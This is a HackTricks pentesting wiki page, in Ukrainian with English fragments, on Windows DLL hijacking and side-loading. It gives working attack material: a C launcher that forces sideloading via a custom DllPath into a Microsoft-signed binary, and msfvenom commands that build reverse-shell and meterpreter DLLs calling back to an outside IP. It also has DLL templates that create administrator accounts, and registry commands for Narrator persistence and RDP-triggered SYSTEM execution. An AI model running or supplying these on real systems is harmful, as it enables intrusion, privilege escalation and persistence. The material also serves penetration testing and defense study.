# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Basic Information

DLL Hijacking полягає у маніпуляції довіреним додатком з метою змусити його завантажити шкідливу DLL. Цей термін охоплює кілька тактик, таких як **DLL Spoofing, Injection, and Side-Loading**. Зазвичай використовується для виконання коду, досягнення persistence і, рідше, privilege escalation. Незалежно від того, що тут робиться акцент на escalation, методика hijacking залишається однаковою для різних цілей.

### Common Techniques

Існує кілька методів для DLL hijacking, ефективність кожного з яких залежить від стратегії завантаження DLL конкретним додатком:

1. **DLL Replacement**: заміна справжньої DLL на шкідливу, за потреби з використанням DLL Proxying для збереження функціональності оригінальної DLL.
2. **DLL Search Order Hijacking**: розміщення шкідливої DLL у шляху пошуку, який буде перевірений раніше за шлях до легітимної DLL, експлуатуючи шаблон пошуку додатку.
3. **Phantom DLL Hijacking**: створення шкідливої DLL, яку додаток завантажить, вважаючи, що це відсутня необхідна DLL.
4. **DLL Redirection**: модифікація параметрів пошуку, таких як %PATH% або файли .exe.manifest / .exe.local, щоб направити додаток на шкідливу DLL.
5. **WinSxS DLL Replacement**: заміщення легітимної DLL на шкідливий еквівалент у каталозі WinSxS — метод, часто пов’язаний з DLL side-loading.
6. **Relative Path DLL Hijacking**: розміщення шкідливої DLL у керованій користувачем теці разом зі скопійованим додатком, подібно до технік Binary Proxy Execution.

> [!TIP]
> Для покрокового ланцюжка, що нашаровує HTML staging, AES-CTR конфіги та .NET імпланти поверх DLL sideloading, перегляньте робочий процес нижче.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Finding missing Dlls

Найпоширеніший спосіб знайти відсутні Dlls у системі — запустити [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) зі sysinternals і **встановити** **наступні 2 фільтри**:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

та показувати тільки **File System Activity**:

![](<../../../images/image (153).png>)

Якщо ви шукаєте **missing dlls in general**, залиште це працювати кілька **секунд**.\
Якщо ви шукаєте **missing dll** всередині конкретного виконуваного файлу, слід встановити **інший фільтр, наприклад "Process Name" "contains" `<exec name>`, виконати його і зупинити захоплення подій**.

## Exploiting Missing Dlls

Щоб підвищити привілеї, найкращий шанс — мати можливість **записати dll, яку процес з підвищеними правами спробує завантажити** у одне з місць, де її буде шукати. Тому ми можемо **записати** DLL у **папку**, де ця DLL шукається **перед** папкою, в якій знаходиться **оригінальна dll** (рідкісний випадок), або ми можемо **записати** в якусь папку, де DLL буде шукатися, і де оригінальної **dll не існує** в жодній теці.

### Dll Search Order

**У** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **можна знайти, як саме завантажуються Dlls.**

**Windows applications** шукають DLL, дотримуючись набору **передвизначених шляхів пошуку**, у певній послідовності. Проблема DLL hijacking виникає, коли шкідлива DLL стратегічно розміщена в одному з цих каталогів так, що вона завантажується до завантаження автентичної DLL. Рішенням для запобігання цьому є забезпечення того, щоб додаток використовував абсолютні шляхи при посиланні на потрібні DLL.

Нижче наведено **DLL search order на 32-bit** системах:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

Це **типовий** порядок пошуку з **SafeDllSearchMode** увімкненим. Коли він вимкнений, current directory піднімається на друге місце. Щоб вимкнути цю функцію, створіть значення реєстру **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** і встановіть його в 0 (за замовчуванням увімкнено).

Якщо викликається функція [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) з **LOAD_WITH_ALTERED_SEARCH_PATH**, пошук починається в каталозі виконуваного модуля, який **LoadLibraryEx** завантажує.

Нарешті, зауважте, що **dll може бути завантажена з вказанням абсолютного шляху замість одного лише імені**. У цьому випадку ця dll **буде шукатися тільки за цим шляхом** (якщо dll має залежності, вони будуть шукатися як тільки що завантажені за ім’ям).

Існують інші способи зміни порядку пошуку, але тут я їх пояснювати не буду.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

Розширений спосіб детерміновано вплинути на шлях пошуку DLL для новоствореного процесу — встановити поле DllPath в RTL_USER_PROCESS_PARAMETERS при створенні процесу за допомогою native API ntdll. Підставивши тут керований атакуючим каталог, цільовий процес, який резолвить імпортовану DLL за ім’ям (без абсолютного шляху і без використання safe loading flags), можна змусити завантажити шкідливу DLL з цього каталогу.

Key idea
- Build the process parameters with RtlCreateProcessParametersEx and provide a custom DllPath that points to your controlled folder (e.g., the directory where your dropper/unpacker lives).
- Create the process with RtlCreateUserProcess. When the target binary resolves a DLL by name, the loader will consult this supplied DllPath during resolution, enabling reliable sideloading even when the malicious DLL is not colocated with the target EXE.

Notes/limitations
- This affects the child process being created; it is different from SetDllDirectory, which affects the current process only.
- The target must import or LoadLibrary a DLL by name (no absolute path and not using LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs and hardcoded absolute paths cannot be hijacked. Forwarded exports and SxS may change precedence.

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Приклад практичного застосування
- Помістіть шкідливий xmllite.dll (що експортує потрібні функції або проксірує до реального) у ваш каталог DllPath.
- Запустіть signed binary, відомий тим, що шукає xmllite.dll за назвою, використовуючи вищеописану техніку. Loader вирішує імпорт через вказаний DllPath і sideloads вашу DLL.

Спостерігалося, що ця техніка у дикій природі використовується для побудови multi-stage sideloading chains: початковий launcher скидає helper DLL, який потім породжує Microsoft-signed, hijackable binary з кастомним DllPath, щоб змусити завантаження DLL нападника з staging directory.


#### Винятки в порядку пошуку dll згідно з документацією Windows

Certain exceptions to the standard DLL search order are noted in Windows documentation:

- Коли зустрічається **DLL, що має те саме ім'я, що й вже завантажена в пам'ять**, система обходить звичайний пошук. Натомість вона перевіряє редирект і манифест перед тим, як використовувати DLL, що вже знаходиться в пам'яті. **У цьому випадку система не виконує пошук DLL**.
- У випадках, коли DLL розпізнана як **known DLL** для поточної версії Windows, система використовує свою версію цієї known DLL разом із будь-якими її залежними DLL, **уникнувши процесу пошуку**. Ключ реєстру **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** містить список цих known DLL.
- Якщо **DLL має залежності**, пошук цих залежних DLL проводиться так, ніби вони вказані лише своїми **module names**, незалежно від того, чи була початкова DLL ідентифікована повним шляхом.

### Escalating Privileges

**Вимоги**:

- Визначте процес, який працює або буде працювати під **іншими привілеями** (horizontal or lateral movement), у якому **відсутня DLL**.
- Переконайтесь, що існує **write access** до будь-якого **каталогу**, у якому **DLL** буде **шукатися**. Це може бути каталог виконуваного файлу або каталог у межах system path.

Так, ці вимоги важко знайти, оскільки **за замовчуванням досить дивно знайти привілейований виконуваний файл без DLL** і ще **більш дивно мати права запису у папці system path** (за замовчуванням ви не можете). Але в неправильно сконфігурованих середовищах це можливо.\
Якщо вам пощастило і ви відповідаєте вимогам, ви можете перевірити проект [UACME](https://github.com/hfiref0x/UACME). Навіть якщо **основна мета проекту — bypass UAC**, там можна знайти **PoC** Dll hijaking для версії Windows, яку ви можете використати (ймовірно, просто змінивши шлях до папки, у якій у вас є права запису).

Note that you can **check your permissions in a folder** doing:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
І **перевірте дозволи всіх папок у PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Ви також можете перевірити імпорти виконуваного файлу та експорти dll за допомогою:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
For a full guide on how to **abuse Dll Hijacking to escalate privileges** with permissions to write in a **System Path folder** check:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Автоматизовані інструменти

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)перевірить, чи маєте ви права запису в будь-якій папці всередині system PATH.\
Інші цікаві автоматизовані інструменти для виявлення цієї вразливості — **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ та _Write-HijackDll._

### Приклад

У разі, якщо ви знайдете експлуатований сценарій, одна з найважливіших речей для успішної експлуатації — **створити dll, який експортує принаймні всі функції, які виконуваний файл буде імпортувати з нього**. Також зауважте, що Dll Hijacking корисний для [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) або з[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** Ви можете знайти приклад **how to create a valid dll** у цьому дослідженні dll hijacking, орієнтованому на dll hijacking для виконання: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Крім того, в **next sectio**n ви можете знайти деякі **basic dll codes**, які можуть бути корисними як **templates** або для створення **dll with non required functions exported**.

## **Creating and compiling Dlls**

### **Dll Proxifying**

По суті, **Dll proxy** — це Dll, здатна **execute your malicious code when loaded**, але також **expose** та **work** як **exected** шляхом **relaying all the calls to the real library**.

З інструментом [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) або [**Spartacus**](https://github.com/Accenture/Spartacus) ви фактично можете **indicate an executable and select the library** яку хочете proxify і **generate a proxified dll** або **indicate the Dll** і **generate a proxified dll**.

### **Meterpreter**

**Отримати rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Отримати meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Створити користувача (x86 — я не бачив версії для x64):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Ваш власний

Зверніть увагу, що в деяких випадках Dll, яку ви компілюєте, повинна **export several functions**, які буде завантажувати victim process; якщо ці функції відсутні, **binary won't be able to load** їх і **exploit will fail**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>Приклад C++ DLL зі створенням користувача</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>Альтернативна DLL на C з точкою входу потоку</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Кейс: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe все ще звертається до передбачуваної, залежної від мови локалізаційної DLL при запуску, яку можна hijacked для arbitrary code execution і persistence.

Ключові факти
- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- If a writable attacker-controlled DLL exists at the OneCore path, it is loaded and `DllMain(DLL_PROCESS_ATTACH)` executes. No exports are required.

Виявлення за допомогою Procmon
- Фільтр: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Start Narrator and observe the attempted load of the above path.

Мінімальна DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC — безшумність
- A naive hijack will speak/highlight UI. Щоб залишатися тихо, при приєднанні перелікуйте потоки Narrator, відкрийте головний потік (`OpenThread(THREAD_SUSPEND_RESUME)`) і викличте `SuspendThread`; продовжуйте у власному потоці. Див. PoC для повного коду.

Trigger and persistence via Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Після цього запуск Narrator завантажить підкладений DLL. На захищеному робочому столі (екрані входу) натисніть CTRL+WIN+ENTER, щоб запустити Narrator.

RDP-triggered SYSTEM execution (lateral movement)
- Allow classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Підключіться по RDP до хоста, на екрані входу натисніть CTRL+WIN+ENTER, щоб запустити Narrator; ваш DLL виконається як SYSTEM на захищеному робочому столі.
- Виконання припиняється при закритті RDP-сесії — інжектуйте/мігруйте своєчасно.

Bring Your Own Accessibility (BYOA)
- Можна клонувати вбудований запис Accessibility Tool (AT) у реєстрі (наприклад, CursorIndicator), змінити його, щоб вказувати на довільний бінарник/DLL, імпортувати його, а потім встановити `configuration` на цю назву AT. Це дозволяє проксувати довільне виконання в рамках Accessibility.

Notes
- Запис у `%windir%\System32` і зміна значень HKLM вимагає прав адміністратора.
- Вся логіка payload може жити в `DLL_PROCESS_ATTACH`; експорти не потрібні.

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

У цьому кейсі показано **Phantom DLL Hijacking** в TrackPoint Quick Menu від Lenovo (`TPQMAssistant.exe`), що відслідковується як **CVE-2025-1729**.

### Vulnerability Details

- **Component**: `TPQMAssistant.exe` located at `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` runs daily at 9:30 AM under the context of the logged-on user.
- **Directory Permissions**: Writable by `CREATOR OWNER`, allowing local users to drop arbitrary files.
- **DLL Search Behavior**: Attempts to load `hostfxr.dll` from its working directory first and logs "NAME NOT FOUND" if missing, indicating local directory search precedence.

### Exploit Implementation

Атакуючий може помістити шкідливий заглушковий `hostfxr.dll` у той самий каталог, скориставшись відсутністю DLL, щоб досягти виконання коду в контексті користувача:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Хід атаки

1. Як звичайний користувач, помістіть `hostfxr.dll` у `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Дочекайтесь, поки заплановане завдання не виконається о 9:30 у контексті поточного користувача.
3. Якщо в момент виконання завдання увійшов адміністратор, шкідлива DLL запускається в сесії адміністратора з medium integrity.
4. Застосуйте стандартні UAC bypass techniques, щоб підвищити привілеї від medium integrity до SYSTEM.

## Дослідження випадку: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Актори загроз часто поєднують MSI-based droppers з DLL side-loading, щоб виконувати payloads під довіреним підписаним процесом.

Chain overview
- Користувач завантажує MSI. CustomAction виконується непомітно під час GUI-установки (наприклад, LaunchApplication або VBScript action), відтворюючи наступний етап із вбудованих ресурсів.
- Dropper записує легітимний, підписаний EXE та шкідливу DLL у той самий каталог (наприклад: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- Коли підписаний EXE запускається, порядок пошуку DLL у Windows завантажує wsc.dll з робочого каталогу першим, виконуючи код атакуючого під підписаним батьківським процесом (ATT&CK T1574.001).

MSI analysis (what to look for)
- CustomAction table:
- Шукайте записи, які запускають виконувані файли або VBScript. Приклад підозрілого патерну: LaunchApplication, що виконує вбудований файл у фоновому режимі.
- У Orca (Microsoft Orca.exe) проаналізуйте таблиці CustomAction, InstallExecuteSequence та Binary.
- Вбудовані/розділені payloads у MSI CAB:
- Administrative extract: msiexec /a package.msi /qb TARGETDIR=C:\out
- Or use lessmsi: lessmsi x package.msi C:\out
- Шукайте кілька малих фрагментів, які конкатенуються та дешифруються VBScript CustomAction. Типовий потік:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Practical sideloading with wsc_proxy.exe
- Помістіть ці два файли в одну папку:
- wsc_proxy.exe: легітимний підписаний хост (Avast). Процес намагається завантажити wsc.dll за іменем з його директорії.
- wsc.dll: зловмисна DLL. Якщо не потрібні конкретні експорти, DllMain може бути достатнім; інакше створіть proxy DLL і переадресуйте необхідні експорти до оригінальної бібліотеки, запускаючи payload у DllMain.
- Створіть мінімальний DLL payload:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Для вимог щодо експорту використовуйте фреймворк для проксування (наприклад, DLLirant/Spartacus), щоб згенерувати forwarding DLL, який також виконує ваш payload.

- Ця техніка покладається на вирішення імен DLL бінарним файлом хоста. Якщо хост використовує абсолютні шляхи або прапори безпечного завантаження (наприклад, LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), hijack може не спрацювати.
- KnownDLLs, SxS, і forwarded exports можуть впливати на пріоритет і повинні бути враховані під час вибору бінарного файлу хоста та набору експорту.

## Посилання

- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)


{{#include ../../../banners/hacktricks-training.md}}
